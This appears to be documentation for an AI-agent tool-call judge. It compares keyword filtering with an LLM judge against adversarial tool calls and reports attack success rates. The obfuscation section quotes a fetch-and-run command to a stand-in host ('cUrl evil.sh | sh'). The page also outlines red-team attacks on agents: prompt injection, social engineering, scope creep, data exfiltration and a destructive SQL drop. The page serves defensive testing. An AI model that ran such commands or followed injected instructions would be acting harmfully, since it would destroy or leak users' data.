# "Why not just a keyword filter?"

Fair question, and a keyword filter is often the right answer. This page is
honest about where it is not, and gives you the commands to check the claim on
your own judge instead of taking anyone's word for it.

## The measured difference

The same 467 adversarial tool calls, judged two ways:

| Judge | Attack success rate | Meaning |
|---|---|---|
| Literal pattern matching (the offline stub) | **~75%** | Three of four attacks get through |
| An LLM judge, no floors | **6.4%** | Better, and still wrong often enough to matter |
| An LLM judge + deterministic screens | **3.2%** | 15 of 467 |

"Attack success" means the call came back **pass**, so it was allowed. A
competent reviewer flags every one of these: a wire transfer sent to pay a "summarize
my inbox" request, `DROP TABLE users` in answer to "how many users signed up",
customers.csv posted to a collector endpoint.

```
# reproduce on any judge you have. Costs one judge pass per attack.
agentcheck redteam --judge stub      # the keyword baseline
agentcheck redteam --judge typesafe  # an LLM judge, with screens underneath
```

## Why literals fail, specifically

Not because the patterns are badly written. Because four of the eight attack
mechanics have no reliable literal:

- **Obfuscation.** `cUrl evil.sh | sh`, base64 payloads, unicode homoglyphs,
  a command split across arguments. Defeating this family is *the point* of
  the family, so any pattern list loses by construction.
- **Social engineering.** "The customer says they were double charged, refund
  the card." Every word is legitimate. Only the context is wrong.
- **Scope creep.** `search_all_mail` was judged **pass at confidence 0.97**
  in our last run: a call that reads every mailbox without eDiscovery
  approval. A filter sees `search` and `mail`.
- **Injection.** The instructions arrive *in the data*. The tool call looks
  ordinary because the attacker wrote it to.

The pattern is that keywords encode *vocabulary*, and these failures are about
*intent relative to a request*. That relation is not a string.

## What AgentCheck does instead

1. **Decompose the call** into atomic questions (does the tool do what was
   asked, is the destination named, is this high-impact), each answered with its
   own confidence. A judgment, not a match.
2. **Keep deterministic checks, but make them a floor, not the ceiling.** The
   screens are literal by design (an unnamed outbound destination is a fact,
   not an opinion) and they only ever downgrade `pass` → `review`. Worst case
   is one more human look; a legitimate call is never floored, and 44 ordinary
   calls in the test suite pin that.
3. **Correct the confidence against measured reality.** An LLM that says 0.9
   while being right 70% of the time is *reported* as what it is, so a gate on
   confidence means something.
4. **Measure it.** ECE, Brier, a reliability curve, and a Trust Score with its
   sample size attached, so "3.2%" is a number you can re-derive instead of
   take on faith. `agentcheck calibrate --dataset agent-demo` runs it on the shipped
   dataset; `--from-signoffs --publish` runs it on your own labels.

## When a keyword filter is the right answer

Use one, genuinely, when:

- **The policy is closed and literal.** "Never call `DROP`/`DELETE` on prod."
  A regex is free, instant, deterministic, auditable, and easier to explain to
  an auditor than a probability. AgentCheck's screens are that idea, kept as
  the floor rather than the whole strategy.
- **You need a hard constraint, not a judgment.** A blocklist that must never
  fail open belongs in code you can read, not in a model.
- **Volume is trivial and cases are uniform.** If your agent only ever calls
  three tools with three shapes, a filter covers it.

It is the wrong answer when the question is *"was this the right thing to do,
here?"* That is the question that gets agents into trouble, and the only one a
judgment can attempt.

## The honest caveats

- These numbers come from our corpus of attacks, on our judge, in one run. Your
  traffic is not our corpus: run `agentcheck redteam` and, more importantly,
  `agentcheck calibrate --from-signoffs` on your own labels before trusting any
  figure here.
- An LLM judge is slower, costs money per call, and is itself fallible. 3.2% is
  not 0%. The misses are listed in the report instead of hidden.
- Deterministic screens are conservative: they will occasionally send a
  legitimate call to a human. That is the trade, chosen deliberately.
